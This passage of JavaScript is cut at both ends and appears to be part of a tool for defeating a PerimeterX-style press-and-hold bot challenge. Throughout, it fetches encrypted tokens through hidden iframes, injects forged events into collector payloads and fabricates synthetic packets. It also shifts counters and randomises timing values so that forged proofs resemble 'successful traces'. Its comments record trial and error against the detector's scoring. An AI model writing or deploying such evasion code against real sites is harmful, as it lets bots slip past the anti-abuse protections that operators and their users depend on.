              for (let i = 0; i < s.length; i++) out += String.fromCharCode(s.charCodeAt(i) ^ key);
              return out;
            }
            try {
              const frame = document.createElement("iframe");
              frame.setAttribute("aria-hidden", "true");
              frame.setAttribute("sandbox", "allow-scripts");
              frame.style.cssText = "position:absolute;visibility:hidden;pointer-events:none;border:0;top:0;left:0;width:100px;height:100px;";
              frame.src = "https://crcldu.com/bd/sync.html?v=" + cfg.version + "#" + cfg.qi;
              let done = false;
              const channels = [];
              function postAttempt(attempt) {
                if (done) return;
                try {
                  const channel = new MessageChannel();
                  channels.push(channel);
                  channel.port1.onmessage = function(ev) {
                    if (done) return;
                    done = true;
                    try {
                      const raw = atob(String(ev && ev.data || ""));
                      const decoded = xorText(raw);
                      const data = JSON.parse(decoded);
                      parent.postMessage({
                        __pxProbeKnpBrokerReady: {
                          qi: cfg.qi,
                          data: {
                            "U0MpSRYgLHo=": data,
                            "cR1LFzd8RSQ=": Date.now()
                          }
                        }
                      }, "*");
                      send("ready", { hasEn: !!(data && data.en), mtr: data && data.mtr });
                    } catch (e) {
                      parent.postMessage({ __pxProbeKnpBrokerError: { qi: cfg.qi, error: String(e && e.message || e) } }, "*");
                    }
                  };
                  try { channel.port1.start && channel.port1.start(); } catch (_) {}
                  const msg = {
                    v: cfg.uuid || "",
                    a: cfg.appId || "PXzC5j78di",
                    i: Math.floor(100 * Math.random()),
                    d: Date.now(),
                    h: window.performance && window.performance.memory && window.performance.memory.usedJSHeapSize,
                    l: cfg.href || location.href
                  };
                  const encoded = btoa(xorText(JSON.stringify(msg)));
                  frame.contentWindow.postMessage(encoded, "*", [channel.port2]);
                  send("posted", { attempt: attempt, len: encoded.length });
                } catch (e) {
                  send("post_error", { attempt: attempt, error: String(e && e.message || e) });
                }
              }
              frame.onload = function() {
                send("inner_onload", { src: frame.src });
                postAttempt(0);
                setTimeout(function(){ postAttempt(1); }, 120);
                setTimeout(function(){ postAttempt(2); }, 300);
                setTimeout(function(){ postAttempt(3); }, 650);
                setTimeout(function(){ postAttempt(4); }, 1100);
                setTimeout(function(){ postAttempt(5); }, 1800);
                setTimeout(function(){ postAttempt(6); }, 3000);
              };
              setTimeout(function() {
                if (!done) parent.postMessage({ __pxProbeKnpBrokerError: { qi: cfg.qi, error: "broker_timeout" } }, "*");
              }, 9500);
              document.body.appendChild(frame);
              send("inner_started", { src: frame.src });
            } catch (e) {
              parent.postMessage({ __pxProbeKnpBrokerError: { qi: cfg.qi, error: String(e && e.message || e) } }, "*");
            }
          };
          const html = "<!doctype html><html><body><script>("
            + brokerMain.toString()
            + ")("
            + JSON.stringify(cfg).replace(/</g, "\\u003c")
            + ");<" + "/script></body></html>";
          broker.srcdoc = html;
          const cleanup = () => {
            try { if (broker && broker.parentNode) broker.parentNode.removeChild(broker); } catch (_) {}
          };
          state.knpBrokerCleanupByQi[qi] = cleanup;
          const timeout = REAL_SET_TIMEOUT(() => {
            try {
              if (state.knpByQi && state.knpByQi[qi]) return;
              push("knp_sandbox_broker_timeout", { qi });
              try { delete state.knpStartedByQi[qi]; } catch (_) { state.knpStartedByQi[qi] = 0; }
              cleanup();
            } catch (_) {}
          }, 11000);
          state.knpBrokerCleanupByQi[qi] = () => {
            try { REAL_CLEAR_TIMEOUT(timeout); } catch (_) {}
            cleanup();
          };
          parent.appendChild(broker);
          push("knp_sandbox_broker_started", { qi, uuid: cfg.uuid, appId: cfg.appId });
          return;
        } catch (e) {
          push("knp_sandbox_broker_start_error", { qi, error: String(e && e.message || e) });
        }
      }
      const frame = document.createElement("iframe");
      frame.setAttribute("aria-hidden", "true");
      frame.setAttribute("sandbox", "allow-scripts");
      frame.style.cssText = "position:absolute;visibility:hidden;pointer-events:none;border:0;top:0;left:0;width:100px;height:100px;";
      const version = 600000 * Math.floor(Date.now() / 600000);
      frame.src = "https://crcldu.com/bd/sync.html?v=" + version + "#" + qi;
      const channels = [];
      const cleanup = () => {
        try {
          for (const ch of channels) {
            try { ch.port1.close(); } catch (_) {}
          }
        } catch (_) {}
        try { if (frame && frame.parentNode) frame.parentNode.removeChild(frame); } catch (_) {}
      };
      const timeout = REAL_SET_TIMEOUT(() => {
        try {
          state.knpTimeoutByQi = state.knpTimeoutByQi || {};
          state.knpTimeoutByQi[qi] = REAL_DATE_NOW();
          push("knp_sandbox_timeout", { qi });
          try { delete state.knpStartedByQi[qi]; } catch (_) { state.knpStartedByQi[qi] = 0; }
          cleanup();
        } catch (_) {}
      }, 10000);
      const handleMessage = ev => {
        try {
          REAL_CLEAR_TIMEOUT(timeout);
          const raw = atob(String(ev && ev.data || ""));
          const decoded = knpXorText(raw, qi);
          const data = JSON.parse(decoded);
          state.knpByQi[qi] = {
            "U0MpSRYgLHo=": data,
            "cR1LFzd8RSQ=": Date.now()
          };
          rememberLastKnp(qi, state.knpByQi[qi]);
          notifyKnpSandboxReady(qi);
          push("knp_sandbox_ready", {
            qi,
            hasEn: !!(data && data.en),
            mtr: data && data.mtr,
            ageMs: REAL_DATE_NOW() - Number(state.knpStartedByQi[qi] || REAL_DATE_NOW())
          });
        } catch (e) {
          push("knp_sandbox_decode_error", { qi, error: String(e && e.message || e) });
        } finally {
          cleanup();
        }
      };
      function postAttempt(attempt) {
        try {
          if (state.knpByQi && state.knpByQi[qi]) return;
          const channel = new MessageChannel();
          channels.push(channel);
          channel.port1.onmessage = handleMessage;
          try { channel.port1.start && channel.port1.start(); } catch (_) {}
          const meta = (state.knpMetaByQi && state.knpMetaByQi[qi]) || {};
          const msg = {
            v: (meta.uuid || parseRawForm(state.lastCollectorBody || "").uuid || ""),
            a: "PXzC5j78di",
            i: Math.floor(100 * Math.random()),
            d: Date.now(),
            h: window.performance && window.performance.memory && window.performance.memory.usedJSHeapSize,
            l: location.href
          };
          const encoded = btoa(knpXorText(JSON.stringify(msg), qi));
          frame.contentWindow.postMessage(encoded, "*", [channel.port2]);
          push("knp_sandbox_posted", { qi, attempt, keys: Object.keys(msg).length });
        } catch (e) {
          push("knp_sandbox_post_error", { qi, attempt, error: String(e && e.message || e) });
        }
      }
      frame.onload = () => {
        try {
          postAttempt(0);
          setTimeout(() => postAttempt(1), 120);
          setTimeout(() => postAttempt(2), 300);
          setTimeout(() => postAttempt(3), 650);
          setTimeout(() => postAttempt(4), 1100);
          setTimeout(() => postAttempt(5), 1800);
          setTimeout(() => postAttempt(6), 3000);
        } catch (e) {
          push("knp_sandbox_post_error", { qi, error: String(e && e.message || e) });
          cleanup();
        }
      };
      parent.appendChild(frame);
      push("knp_sandbox_started", { qi, src: frame.src });
    } catch (e) {
      try { push("knp_sandbox_start_error", { qi, error: String(e && e.message || e) }); } catch (_) {}
    }
  }
  function notifyKnpSandboxReady(qi) {
    try {
      qi = String(qi || "1604064986000");
      let data = state.knpByQi && state.knpByQi[qi];
      let source = "exact_qi";
      if ((!data || !data["U0MpSRYgLHo="]) && (!AUTO_ACTIONS || AUTO_ACTIONS.knpFallbackLast !== false) && state.lastKnpData && state.lastKnpData["U0MpSRYgLHo="]) {
        data = state.lastKnpData;
        source = "last_ready_qi";
      }
      if (!data) return;
      const sourceQi = source === "last_ready_qi" ? (state.lastKnpQi || "") : qi;
      const msg = { __pxProbeKnpReady: { qi, data, source, sourceQi } };
      if (window.top && window.top !== window) {
        try { window.top.postMessage(msg, "*"); } catch (_) {}
      }
      const targets = state.knpRequestSourcesByQi && state.knpRequestSourcesByQi[qi];
      if (targets && targets.length) {
        for (const src of targets.slice()) {
          try { src.postMessage(msg, "*"); } catch (_) {}
        }
        push("knp_sandbox_ready_broadcast", { qi, targets: targets.length, source, sourceQi });
      }
    } catch (e) {
      try { push("knp_sandbox_ready_broadcast_error", { qi, error: String(e && e.message || e) }); } catch (_) {}
    }
  }
  function requestTopKnpSandbox(qi) {
    try {
      if (!window.top || window.top === window) return;
      const form = parseRawForm(state.lastCollectorBody || "");
      window.top.postMessage({
        __pxProbeKnpRequest: {
          qi: String(qi || "1604064986000"),
          uuid: form.uuid || "",
          appId: form.appId || "PXzC5j78di"
        }
      }, "*");
      push("knp_sandbox_top_requested", { qi: String(qi || "1604064986000"), uuid: form.uuid || "" });
    } catch (e) {
      push("knp_sandbox_top_request_error", { qi, error: String(e && e.message || e) });
    }
  }
  function rememberCollectorQi(qi, reason) {
    try {
      qi = String(qi || "");
      if (!qi || qi === "1604064986000") return;
      state.lastCollectorQi = qi;
      if (String(location.href || "").indexOf("ch_ctx=1") >= 0) state.lastChallengeQi = qi;
      state.lastCollectorQiReason = String(reason || "");
    } catch (_) {}
  }
  function prestartLatestKnp(reason) {
    try {
      const hrefNow = String(location.href || "");
      const hasChallengeQiHint = !!(state.lastChallengeQi || state.externalChallengeQi);
      if (/mouse_down|hold/i.test(String(reason || "")) && hrefNow.indexOf("ch_ctx=1") < 0 && !hasChallengeQiHint) {
        push("knp_sandbox_hold_prestart_skip", { reason: String(reason || ""), qi: "", href: hrefNow.slice(0, 160), why: "not_ch_ctx" });
        return false;
      }
      let qi = String(state.lastChallengeQi || state.externalChallengeQi || state.lastCollectorQi || state.lastCollectorQiHint || "");
      if (!qi || qi === "1604064986000") {
        try {
          const parsed = decodeCollectorPayload(state.lastCollectorBody || "");
          qi = String(parsed && parsed.qi || "");
        } catch (_) {}
      }
      if (!qi || qi === "1604064986000") {
        push("knp_sandbox_hold_prestart_skip", { reason: String(reason || ""), qi });
        return false;
      }
      const force = /after_mouse_down|hold_start_force|force_restart/i.test(String(reason || ""));
      startKnpSandboxProbe(qi, force);
      requestTopKnpSandbox(qi);
      push("knp_sandbox_hold_prestart", { qi, reason: String(reason || ""), force, href: hrefNow.slice(0, 160) });
      return true;
    } catch (e) {
      push("knp_sandbox_hold_prestart_error", { reason: String(reason || ""), error: String(e && e.message || e) });
      return false;
    }
  }
  try {
    Object.defineProperty(window, "__pxProbeKnpPrestartLatest", {
      configurable: true,
      writable: true,
      value: function(reason) { return prestartLatestKnp(reason || "direct"); }
    });
  } catch (_) {
    try { window.__pxProbeKnpPrestartLatest = function(reason) { return prestartLatestKnp(reason || "direct"); }; } catch (_) {}
  }
  try {
    window.addEventListener("message", ev => {
      try {
        try {
          const data = ev && ev.data;
          const isProbeMsg = !!(data && (
            data.__pxProbeKnpRequest || data.__pxProbeKnpReady ||
            data.__pxProbeKnpBrokerReady || data.__pxProbeKnpBrokerLog ||
            data.__pxProbeKnpBrokerError || data.__pxProbeKnpPrestart ||
            data.__pxProbeEvent || data.__pxProbeBodyDump || data.__pxProbeTimeWarpCommand
          ));
          if (!isProbeMsg) {
            let text = "";
            if (typeof data === "string") text = data;
            else if (data && typeof data === "object") {
              try { text = JSON.stringify(data); } catch (_) { text = String(data); }
            }
            if (text && /captcha|token|verify|challenge|status|success|fail|px|hsprotect/i.test(text)) {
              state.hostMessageLogCount = Number(state.hostMessageLogCount || 0) + 1;
              if (state.hostMessageLogCount <= 80) {
                push("host_message_event", {
                  origin: ev && ev.origin,
                  href: String(location.href || "").slice(0, 180),
                  sourceIsTop: !!(ev && ev.source && ev.source === window.top),
                  sourceIsParent: !!(ev && ev.source && ev.source === window.parent),
                  data: text.slice(0, 1000)
                });
              }
            }
          }
        } catch (_) {}
        const pre = ev && ev.data && ev.data.__pxProbeKnpPrestart;
        if (pre) {
          prestartLatestKnp(pre.reason || "message");
        }
        const req = ev && ev.data && ev.data.__pxProbeKnpRequest;
        if (req && req.qi) {
          const qi = String(req.qi);
          state.knpMetaByQi = state.knpMetaByQi || {};
          state.knpMetaByQi[qi] = {
            uuid: req.uuid || "",
            appId: req.appId || "PXzC5j78di"
          };
          state.knpRequestSourcesByQi = state.knpRequestSourcesByQi || {};
          state.knpRequestSourcesByQi[qi] = state.knpRequestSourcesByQi[qi] || [];
          if (ev.source && state.knpRequestSourcesByQi[qi].indexOf(ev.source) < 0) {
            state.knpRequestSourcesByQi[qi].push(ev.source);
          }
          push("knp_sandbox_request_received", { qi, sources: state.knpRequestSourcesByQi[qi].length });
          startKnpSandboxProbe(qi);
          notifyKnpSandboxReady(qi);
        }
        const ready = ev && ev.data && ev.data.__pxProbeKnpReady;
        if (ready && ready.qi && ready.data) {
          const qi = String(ready.qi);
          const readySource = ready.source || "exact_qi";
          const readySourceQi = String(ready.sourceQi || qi);
          state.knpByQi = state.knpByQi || {};
          if (readySource !== "exact_qi") {
            state.fallbackKnpByQi = state.fallbackKnpByQi || {};
            state.fallbackKnpSourceQiByQi = state.fallbackKnpSourceQiByQi || {};
            state.fallbackKnpByQi[qi] = ready.data;
            state.fallbackKnpSourceQiByQi[qi] = readySourceQi;
            rememberLastKnp(readySourceQi, ready.data);
            push("knp_sandbox_ready_received", {
              qi,
              source: readySource,
              sourceQi: readySourceQi,
              hasEn: !!(ready.data["U0MpSRYgLHo="] && ready.data["U0MpSRYgLHo="].en)
            });
          } else if (!state.knpByQi[qi]) {
            state.knpByQi[qi] = ready.data;
            rememberLastKnp(qi, ready.data);
            push("knp_sandbox_ready_received", {
              qi,
              hasEn: !!(ready.data["U0MpSRYgLHo="] && ready.data["U0MpSRYgLHo="].en)
            });
          }
        }
        const brokerReady = ev && ev.data && ev.data.__pxProbeKnpBrokerReady;
        if (brokerReady && brokerReady.qi && brokerReady.data) {
          const qi = String(brokerReady.qi);
          state.knpByQi = state.knpByQi || {};
          state.knpByQi[qi] = brokerReady.data;
          try {
            if (state.fallbackKnpByQi) delete state.fallbackKnpByQi[qi];
            if (state.fallbackKnpSourceQiByQi) delete state.fallbackKnpSourceQiByQi[qi];
          } catch (_) {}
          rememberLastKnp(qi, brokerReady.data);
          try {
            const cleanup = state.knpBrokerCleanupByQi && state.knpBrokerCleanupByQi[qi];
            if (typeof cleanup === "function") cleanup();
          } catch (_) {}
          push("knp_sandbox_broker_ready", {
            qi,
            hasEn: !!(brokerReady.data["U0MpSRYgLHo="] && brokerReady.data["U0MpSRYgLHo="].en)
          });
          notifyKnpSandboxReady(qi);
        }
        const brokerLog = ev && ev.data && ev.data.__pxProbeKnpBrokerLog;
        if (brokerLog && brokerLog.qi) {
          push("knp_sandbox_broker_log", brokerLog);
        }
        const brokerError = ev && ev.data && ev.data.__pxProbeKnpBrokerError;
        if (brokerError && brokerError.qi) {
          push("knp_sandbox_broker_error", brokerError);
          try {
            const qi = String(brokerError.qi);
            if (!(state.knpByQi && state.knpByQi[qi])) delete state.knpStartedByQi[qi];
          } catch (_) {}
        }
      } catch (e) {
        push("knp_sandbox_message_error", { error: String(e && e.message || e) });
      }
    });
  } catch (e) {
    try { push("knp_sandbox_message_hook_error", { error: String(e && e.message || e) }); } catch (_) {}
  }
  function injectKnpSandboxEvent(events, qi) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.injectKnpSandboxEvent) return false;
      qi = String(qi || "1604064986000");
      const isFinalProofPacket = (events || []).some(ev => ev && ev.t === "PX561");
      const tags = (events || []).map(ev => ev && ev.t).filter(Boolean);
      if (AUTO_ACTIONS.knpFinalOnly !== false && !isFinalProofPacket) {
        // The crcldu auditor appears session/context sensitive.  A live failed
        // run generated a valid exact Knp for a pre-challenge aRV-only packet,
        // then had to reuse it as fallback for the real final proof and scored
        // binary=1.  Successful traces only need Knp on the final PX561 proof,
        // so do not spend the broker response on earlier collector envelopes.
        const href = String(location.href || "");
        const canPrestart = !!(
          AUTO_ACTIONS.knpPrestartOnChallenge !== false
          && qi !== "1604064986000"
          && href.indexOf("ch_ctx=1") >= 0
          && (tags.indexOf("Y1NZWSUzXWs=") >= 0 || tags.indexOf("U0MpSRYiJH8=") >= 0)
        );
        if (canPrestart) {
          startKnpSandboxProbe(qi);
          requestTopKnpSandbox(qi);
          push("knp_sandbox_challenge_prestart", { qi, tags, href: href.slice(0, 160) });
        }
        return false;
      }
      startKnpSandboxProbe(qi);
      requestTopKnpSandbox(qi);
      let core = state.knpByQi && state.knpByQi[qi];
      let source = "exact_qi";
      let sourceQi = qi;
      const requireExactForFinal = !!(
        isFinalProofPacket
        && AUTO_ACTIONS
        && Number(AUTO_ACTIONS.exactKnpWaitMs || 0) > 0
        && !(state.allowFinalKnpFallbackByQi && state.allowFinalKnpFallbackByQi[qi])
      );
      if (requireExactForFinal && (!core || !core["U0MpSRYgLHo="])) {
        push("knp_sandbox_exact_required_missing", { qi, tags: (events || []).map(ev => ev && ev.t).filter(Boolean) });
        return false;
      }
      if ((!core || !core["U0MpSRYgLHo="]) && state.fallbackKnpByQi && state.fallbackKnpByQi[qi] && state.fallbackKnpByQi[qi]["U0MpSRYgLHo="]) {
        core = state.fallbackKnpByQi[qi];
        source = "broadcast_fallback";
        sourceQi = (state.fallbackKnpSourceQiByQi && state.fallbackKnpSourceQiByQi[qi]) || state.lastKnpQi || "";
      }
      if ((!core || !core["U0MpSRYgLHo="]) && (!AUTO_ACTIONS || AUTO_ACTIONS.knpFallbackLast !== false) && state.lastKnpData && state.lastKnpData["U0MpSRYgLHo="]) {
        core = state.lastKnpData;
        source = "last_ready_qi";
        sourceQi = state.lastKnpQi || "";
      }
      if (!core || !core["U0MpSRYgLHo="]) return false;
      for (const ev of events || []) if (ev && ev.t === "KnpQcG8ZVUI=") return false;
      let base = null;
      for (const ev of events || []) {
        if (ev && ev.t === "aRVTHy91Wio=" && ev.d && typeof ev.d === "object") {
          base = ev.d;
          break;
        }
      }
      // Successful traces only carry KnpQcG8ZVUI= alongside the aRVTHy91Wio=
      // collector envelope (including the final aRV+PX561 proof packet).  When
      // we injected it into seq=1 Y1NZWSUzXWs= or post-failure W0cq/GC packets,
      // the collector immediately flipped to score|1.  Keep Knp scoped to the
      // same packet class as the natural samples.
      if (!base) return false;
      const copyKeys = [
        "VGBuahICYlE=",
        "QS07ZwRKPlU=",
        "FUFvS1Mga38=",
        "fg4ERDtuD3I=",
        "XGhmYhkIbVU=",
        "RTE/ewNXNUA=",
        "O2sBIX4NDBQ=",
        "AzN5eUVQckM=",
        "WQUjDxxjKjU=",
        "GUVjT1wnbn4="
      ];
      const baseCount = Number(base["HUlnQ1slanM="]);
      const hu = Number.isFinite(baseCount) ? baseCount + 1 : 3;
      const baseElapsed = Number(base["R3c9PQEXNg8="]);
      const r3 = Number.isFinite(baseElapsed) ? Math.round(baseElapsed + 250 + Math.random() * 120) : undefined;
      const d = {};
      // Natural KnpQcG8ZVUI= objects have a stable wire shape.  In successful
      // captures cR1LFzd8RSQ= is the current qi, and HU/R3 appear before the
      // collector envelope fields.  Keeping Date.now() here made the injected
      // first-round Knp score as binary=1 even though pc/noise were valid.
      d["U0MpSRYgLHo="] = jsonClone(core["U0MpSRYgLHo="]);
      const qiNum = Number(qi);
      d["cR1LFzd8RSQ="] = Number.isFinite(qiNum) ? qiNum : (core["cR1LFzd8RSQ="] || Date.now());
      d["HUlnQ1slanM="] = hu;
      if (r3 !== undefined) d["R3c9PQEXNg8="] = r3;
      for (const k of copyKeys) if (Object.prototype.hasOwnProperty.call(base, k)) d[k] = jsonClone(base[k]);
      const ev = { t: "KnpQcG8ZVUI=", d };
      let insertAt = -1;
      for (let i = 0; i < (events || []).length; i++) {
        if (events[i] && (events[i].t === "PX561" || events[i].t === "JDBeOmJSWwo=")) {
          insertAt = i;
          break;
        }
      }
      if (insertAt < 0) events.push(ev);
      else events.splice(insertAt, 0, ev);
      let shiftedAfter = 0;
      if (insertAt >= 0) {
        for (let i = insertAt + 1; i < (events || []).length; i++) {
          const d2 = events[i] && events[i].d;
          if (!d2 || typeof d2 !== "object") continue;
          const n = Number(d2["HUlnQ1slanM="]);
          if (Number.isFinite(n)) {
            d2["HUlnQ1slanM="] = n + 1;
            shiftedAfter++;
          }
        }
      }
      push("knp_sandbox_event_injected", {
        qi,
        source,
        sourceQi,
        insertAt,
        hasEn: !!(d["U0MpSRYgLHo="] && d["U0MpSRYgLHo="].en),
        hu: d["HUlnQ1slanM="],
        r3: d["R3c9PQEXNg8="],
        shiftedAfter
      });
      return true;
    } catch (e) {
      push("knp_sandbox_inject_error", { qi, error: String(e && e.message || e) });
      return false;
    }
  }
  function normalizeKnpEventScope(events) {
    try {
      if (!Array.isArray(events) || !events.length) return false;
      const beforeTags = events.map(ev => ev && ev.t).filter(Boolean);
      const beforeJson = JSON.stringify(events);
      const hasArv = events.some(ev => ev && ev.t === "aRVTHy91Wio=");
      const hasPx = events.some(ev => ev && ev.t === "PX561");

      // Knp is natural either as a standalone Knp packet or in aRV envelopes.
      // Drop only accidental mixed Knp in seq=1 Y1... or post-failure W0c/GC.
      if (!hasArv) {
        const nonKnpTags = events.map(ev => ev && ev.t).filter(t => t && t !== "KnpQcG8ZVUI=");
        if (nonKnpTags.length > 0) {
          for (let i = events.length - 1; i >= 0; i--) {
            if (events[i] && events[i].t === "KnpQcG8ZVUI=") {
              events.splice(i, 1);
            }
          }
        }
        const changed = JSON.stringify(events) !== beforeJson;
        if (changed) push("knp_scope_normalized", { before: beforeTags, after: events.map(ev => ev && ev.t).filter(Boolean) });
        return changed;
      }

      // De-duplicate Knp while preserving natural order.  Successful captures
      // include both [Knp, aRV, PX...] and [aRV, Knp, PX...] shapes.  Only move
      // Knp when it is clearly too late (after PX/JDBe).
      let seenKnp = false;
      for (let i = 0; i < events.length; i++) {
        if (events[i] && events[i].t === "KnpQcG8ZVUI=") {
          if (seenKnp) {
            events.splice(i, 1);
            i--;
            continue;
          }
          seenKnp = true;
        }
      }
      let knpIndex0 = -1, firstProofIndex0 = -1;
      for (let i = 0; i < events.length; i++) {
        if (knpIndex0 < 0 && events[i] && events[i].t === "KnpQcG8ZVUI=") knpIndex0 = i;
        if (firstProofIndex0 < 0 && events[i] && (events[i].t === "PX561" || events[i].t === "JDBeOmJSWwo=")) firstProofIndex0 = i;
      }
      if (knpIndex0 >= 0 && firstProofIndex0 >= 0 && knpIndex0 > firstProofIndex0) {
        const keep = events.splice(knpIndex0, 1)[0];
        if (knpIndex0 < firstProofIndex0) firstProofIndex0--;
        events.splice(firstProofIndex0, 0, keep);
      }
      // If Knp is already present (for example from an exact broker), older
      // probe builds left the following PX/JDBe counters as 4/5.  Successful
      // traces have a deliberate gap after Knp: aRV=2, Knp=3, PX=5, JDBe=6.
      if (hasPx) {
        let knpIndex = -1;
        for (let i = 0; i < events.length; i++) {
          if (events[i] && events[i].t === "KnpQcG8ZVUI=") {
            knpIndex = i;
            break;
          }
        }
        if (knpIndex >= 0) {
          const knpD = events[knpIndex] && events[knpIndex].d;
          const knpHu = Number(knpD && knpD["HUlnQ1slanM="]);
          let pxD = null;
          for (const ev of events) if (ev && ev.t === "PX561" && ev.d && typeof ev.d === "object") pxD = ev.d;
          const pxHu = Number(pxD && pxD["HUlnQ1slanM="]);
          if (Number.isFinite(knpHu) && Number.isFinite(pxHu) && pxHu === knpHu + 1) {
            for (let i = knpIndex + 1; i < events.length; i++) {
              const d2 = events[i] && events[i].d;
              if (!d2 || typeof d2 !== "object") continue;
              const n = Number(d2["HUlnQ1slanM="]);
              if (Number.isFinite(n)) d2["HUlnQ1slanM="] = n + 1;
            }
          }
        }
      }
      const changed = JSON.stringify(events) !== beforeJson;
      if (changed) push("knp_scope_normalized", { before: beforeTags, after: events.map(ev => ev && ev.t).filter(Boolean) });
      return changed;
    } catch (e) {
      push("knp_scope_normalize_error", { error: String(e && e.message || e) });
      return false;
    }
  }
  function normalizeFinalProofEnvelope(events) {
    try {
      if (!Array.isArray(events) || !events.length) return false;
      const beforeJson = JSON.stringify(events);
      const before = events.map(ev => ev && ev.t).filter(Boolean);
      const arv = events.find(ev => ev && ev.t === "aRVTHy91Wio=" && ev.d && typeof ev.d === "object");
      const px = events.find(ev => ev && ev.t === "PX561" && ev.d && typeof ev.d === "object");
      if (!arv || !px) return false;
      const envelopeKeys = [
        "QS07ZwRKPlU=",
        "FUFvS1Mga38=",
        "fg4ERDtuD3I=",
        "XGhmYhkIbVU=",
        "RTE/ewNXNUA=",
        "O2sBIX4NDBQ=",
        "AzN5eUVQckM=",
        "WQUjDxxjKjU=",
        "GUVjT1wnbn4="
      ];
      for (const ev of events) {
        if (!ev || !ev.d || typeof ev.d !== "object") continue;
        if (ev.t !== "KnpQcG8ZVUI=" && ev.t !== "PX561" && ev.t !== "JDBeOmJSWwo=" && ev.t !== "BFA+GkExMiE=") continue;
        for (const k of envelopeKeys) {
          if (Object.prototype.hasOwnProperty.call(arv.d, k) && Object.prototype.hasOwnProperty.call(ev.d, k)) {
            ev.d[k] = jsonClone(arv.d[k]);
          }
        }
      }
      const pxR3 = px.d["R3c9PQEXNg8="];
      for (const ev of events) {
        if (ev && (ev.t === "JDBeOmJSWwo=" || ev.t === "BFA+GkExMiE=") && ev.d && typeof ev.d === "object" && pxR3 !== undefined) {
          ev.d["R3c9PQEXNg8="] = jsonClone(pxR3);
        }
      }
      // In successful traces the final PX/JDBe envelope is emitted shortly
      // after pointerup: PX.R3 - PX.Ui ~= 1.3s.  Time-warp broker waits can
      // leave the same proof with a 6-8s tail, which is visible telemetry even
      // when the inner hold timings are normalized.
      const ui = Number(px.d["Ui5jKBREZxs="]);
      const r3 = Number(px.d["R3c9PQEXNg8="]);
      const shortProofR3 = looksShortManualProofData(px.d);
      const r3Min = shortProofR3 ? 1250 : 700;
      const r3Max = shortProofR3 ? 1850 : 2500;
      if (Number.isFinite(ui) && Number.isFinite(r3) && (r3 - ui > r3Max || r3 - ui < r3Min)) {
        const target = shortProofR3
          ? Math.round(ui + 1420 + Math.random() * 240)
          : Math.round(ui + 1240 + Math.random() * 260);
        px.d["R3c9PQEXNg8="] = target;
        for (const ev of events) {
          if (ev && (ev.t === "JDBeOmJSWwo=" || ev.t === "BFA+GkExMiE=") && ev.d && typeof ev.d === "object") {
            ev.d["R3c9PQEXNg8="] = target;
          }
        }
      }
      const changed = JSON.stringify(events) !== beforeJson;
      if (changed) push("final_proof_envelope_normalized", { before, after: events.map(ev => ev && ev.t).filter(Boolean) });
      return changed;
    } catch (e) {
      push("final_proof_envelope_normalize_error", { error: String(e && e.message || e) });
      return false;
    }
  }
  function cacheKnpFromExistingPayload(events, qi) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.injectKnpSandboxEvent) return;
      for (const ev of events || []) {
        if (ev && ev.t === "KnpQcG8ZVUI=" && ev.d && ev.d["U0MpSRYgLHo="]) {
          rememberLastKnp(qi, ev.d);
          state.knpByQi = state.knpByQi || {};
          if (qi) state.knpByQi[String(qi)] = jsonClone(ev.d);
          push("knp_sandbox_cached_from_payload", {
            qi: String(qi || ""),
            hasEn: !!(ev.d["U0MpSRYgLHo="] && ev.d["U0MpSRYgLHo="].en),
            tags: (events || []).map(x => x && x.t).filter(Boolean)
          });
          return;
        }
      }
    } catch (e) {
      push("knp_sandbox_cache_from_payload_error", { qi, error: String(e && e.message || e) });
    }
  }
  function cacheU0FromExistingPayload(events, qi) {
    try {
      state.u0SeenByQi = state.u0SeenByQi || {};
      for (const ev of events || []) {
        if (ev && ev.t === "U0MpSRYiJH8=" && ev.d && typeof ev.d === "object") {
          state.u0SeenByQi[String(qi || "")] = jsonClone(ev.d);
          push("u0_packet_seen", {
            qi: String(qi || ""),
            hu: ev.d["HUlnQ1slanM="],
            r3: ev.d["R3c9PQEXNg8="],
            qs: ev.d["QS07ZwRKPlU="]
          });
          return;
        }
      }
    } catch (e) {
      push("u0_packet_seen_error", { qi, error: String(e && e.message || e) });
    }
  }
  function getU0ForFinalNormalization(qi) {
    try {
      qi = String(qi || "");
      const synthetic = state.syntheticU0ByQi && state.syntheticU0ByQi[qi];
      if (synthetic) return { data: synthetic, source: "synthetic" };
      const seen = state.u0SeenByQi && state.u0SeenByQi[qi];
      if (seen) return { data: seen, source: "seen" };
    } catch (_) {}
    return null;
  }
  function makeSyntheticU0FromFinalEvents(events) {
    try {
      const arv = (events || []).find(ev => ev && ev.t === "aRVTHy91Wio=" && ev.d && typeof ev.d === "object");
      if (!arv) return null;
      const base = arv.d;
      const out = {};
      const baseHu = Number(base["HUlnQ1slanM="]);
      const baseR3 = Number(base["R3c9PQEXNg8="]);
      const baseQs = Number(base["QS07ZwRKPlU="]);
      out["HUlnQ1slanM="] = Number.isFinite(baseHu) ? Math.round(baseHu + 1) : 3;
      out["R3c9PQEXNg8="] = Number.isFinite(baseR3) ? Math.round(baseR3 + 420 + Math.random() * 90) : undefined;
      if (Number.isFinite(baseQs)) out["QS07ZwRKPlU="] = Math.round(baseQs - 9300 + Math.random() * 120);
      const keys = [
        "FUFvS1Mga38=",
        "fg4ERDtuD3I=",
        "XGhmYhkIbVU=",
        "RTE/ewNXNUA=",
        "O2sBIX4NDBQ=",
        "AzN5eUVQckM=",
        "WQUjDxxjKjU=",
        "GUVjT1wnbn4=",
        "SlpwEAw5eSc="
      ];
      for (const k of keys) if (Object.prototype.hasOwnProperty.call(base, k)) out[k] = jsonClone(base[k]);
      for (const k of Object.keys(out)) if (out[k] === undefined) delete out[k];
      return { t: "U0MpSRYiJH8=", d: out };
    } catch (e) {
      push("synthetic_u0_make_error", { error: String(e && e.message || e) });
      return null;
    }
  }
  function applySyntheticU0FinalShift(events, qi) {
    try {
      qi = String(qi || "");
      const u0Info = getU0ForFinalNormalization(qi);
      const u0 = u0Info && u0Info.data;
      if (!u0 || !Array.isArray(events)) return false;
      const synthetic = u0Info && u0Info.source === "synthetic";
      const hasPx = events.some(ev => ev && ev.t === "PX561");
      if (!hasPx) return false;
      const before = JSON.stringify(events);
      const u0Hu = Number(u0["HUlnQ1slanM="]);
      const u0R3 = Number(u0["R3c9PQEXNg8="]);
      for (const ev of events) {
        if (!ev || !ev.d || typeof ev.d !== "object") continue;
        if (ev.t === "KnpQcG8ZVUI=") {
          if (Number.isFinite(u0Hu)) ev.d["HUlnQ1slanM="] = Math.round(u0Hu + 1);
